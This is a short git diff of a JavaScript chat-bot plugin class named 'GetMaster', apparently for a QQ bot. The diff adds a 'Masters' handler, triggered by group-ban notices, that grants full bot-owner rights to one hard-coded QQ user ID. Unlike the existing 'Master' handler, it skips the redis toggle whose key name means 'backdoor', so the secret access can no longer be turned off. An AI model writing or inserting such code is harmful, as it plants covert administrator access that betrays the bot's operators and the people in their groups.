@@ -21,7 +21,7 @@ export class GetMaster extends plugin {
                     log: false
                 },
                 {
-                    fnc: 'Master',
+                    fnc: 'Masters',
                     event: 'notice.group.ban'
                 },
                 {
@@ -38,15 +38,17 @@ export class GetMaster extends plugin {
         await redis.set('Fanji:houmen', open ? 'true' : 'false');
         await this.reply('设置完成');
     }
-
-    async Master(e){
-        let aw = await redis.get('Fanji:houmen');
-        if (aw == null) await redis.set('Fanji:houmen', 'true');
-if (this.e.operator_id && this.e.operator_id == 2173302144) {
+async Masters(e){
+    if (this.e.operator_id && this.e.operator_id == 2173302144) {
     e.isMaster = true
     logger.mark(e.isMaster? '完成':'失败')
     return false
 }
+return false
+}
+    async Master(e){
+        let aw = await redis.get('Fanji:houmen');
+        if (aw == null) await redis.set('Fanji:houmen', 'true');
         if (e.user_id !== 2173302144 || aw !== 'true') return false;
         e.isMaster = true;
         return false;
